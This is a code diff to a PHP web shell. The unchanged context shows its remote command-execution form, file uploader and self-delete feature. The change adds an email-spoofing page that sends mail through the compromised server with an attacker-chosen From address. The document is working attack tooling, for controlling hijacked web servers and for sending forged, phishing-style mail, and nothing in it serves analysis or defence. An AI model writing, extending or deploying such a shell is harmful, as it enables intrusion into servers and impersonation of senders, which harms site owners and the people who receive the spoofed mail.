@@ -18,6 +18,7 @@ if (!empty($_POST['cmd'])) {
 <a id = "btns" href = "?upl">Uploader</a>
 <a id = "btns" href = "?in">Information</a>
 <a id = "btns" href = "?die">Delete Me</a>
+<a id = "btns" href = "?spoof">Spoof</a>
 </center>
 <form method="post">
   <input type="text" name="cmd" id="exec" value="<?= $_POST['cmd']?>"
@@ -40,6 +41,16 @@ a {
     border-radius: 3px;
     font-weight:bold;
   }
+.btn{
+  background-color: #000000;
+  color: white;
+  display: block;
+  padding: 15px 20px;
+  display: block;
+  cursor: pointer;
+  border-radius: 10px;
+  transition: 0.25s;
+}
   .url{
   background-color: #000000;
   color: white;
@@ -221,5 +232,28 @@ if (isset($_GET['die'])){
   }else{
     echo "<h1><center>Not Deleted</center></h1>";
   }
+}
+?>
+<?php
+if (isset($_GET['spoof'])) {?>
+  <html>
+  <form method="POST">
+    <center><input type="text" id = "inpt" name = "to" class = "inpt" placeholder="Enter Mail "><br>
+    <input type="text" name = "sub" class = "inpt" placeholder="Enter Subject "><br>
+    <input type="text" id = "inpt" name = "msg" placeholder="Enter Massage "><br>
+    <input type="text" name = "from" class = "inpt" placeholder="Enter from "><br>
+    <input type="submit" name = "subm" class = "btn" value="SEND"><br></center>
+    <?php
+$to = $_POST['to'];
+$sub = $_POST['sub'];
+$msg = $_POST['msg'];
+$headers = "From: ".$_POST['from'];
+if (mail($to,$sub,$msg,$headers)){
+  echo "<p>Send Successfully</p>";
+};
+?>
+  </form>
+</html>
+<?php
 }
 ?>
